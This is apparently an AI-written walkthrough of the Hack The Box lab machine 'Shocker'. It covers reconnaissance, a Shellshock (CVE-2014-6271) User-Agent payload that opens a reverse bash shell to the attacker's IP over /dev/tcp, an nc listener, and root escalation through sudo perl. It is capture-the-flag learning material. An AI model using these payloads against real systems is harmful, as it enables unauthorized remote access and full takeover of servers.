## 🧨 HTB: Shocker Walkthrough

### 📦 Machine Info
- **Name**: Shocker
- **OS**: Linux (Ubuntu 16.04)
- **Difficulty**: Easy
- **Exploits**: CVE-2014-6271 (Shellshock)
- **Ports**: 80 (HTTP), 2222 (SSH)

---

### 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.56
nmap -p 80,2222 -sCV -oA scans/scripts 10.10.10.56
```
- Port 80: Apache/2.4.18 (Ubuntu)
- Port 2222: OpenSSH 7.2p2 (Ubuntu 16.04)

---

### 🌐 Web Enumeration
```bash
feroxbuster -u http://10.10.10.56 -x php,html -f -n
```
Discovered:
- `/cgi-bin/` directory (403 Forbidden)
- `/cgi-bin/user.sh` script (200 OK)

---

### 🐚 ShellShock (CVE-2014-6271) Exploit
Using Burp or curl to test ShellShock via `User-Agent`:
```http
User-Agent: () { :;}; echo; /bin/ping -c 1 <YOUR_IP>
```
For reverse shell:
```bash
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1
```
Start a listener:
```bash
nc -lvnp 443
```
Successful shell as:
```bash
shelly@Shocker:/usr/lib/cgi-bin$
```
Stabilize:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
```

---

### 🧼 Privilege Escalation
Check `sudo` permissions:
```bash
sudo -l
```
Output:
```bash
(root) NOPASSWD: /usr/bin/perl
```
Exploit:
```bash
sudo perl -e 'exec "/bin/bash"'
```
You now have a root shell:
```bash
root@Shocker:~# cat /root/root.txt
```

---

### 🛠 Beyond Root: Apache Config Quirk
Apache config snippet at `/etc/apache2/conf-enabled/serve-cgi-bin.conf`:
```apache
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
```
The trailing slash is required. Without it, `/cgi-bin` returns 404.

To test:
```bash
curl http://10.10.10.56/cgi-bin/        # 200 OK
curl http://10.10.10.56/cgi-bin         # 404 Not Found
```

---

### 📚 Notes on ShellShock Behavior
- Only bash builtins (e.g. `echo`, `printf`) continue execution after initial eval.
- Binaries (e.g. `python3`, `perl`, etc.) often cause execution to halt.
- Chaining works best with pipes (`|`) rather than `;` or `&&`.


Let me know if you want walkthroughs for other boxes like Sunday, Sense, or Valentine 🧠💥

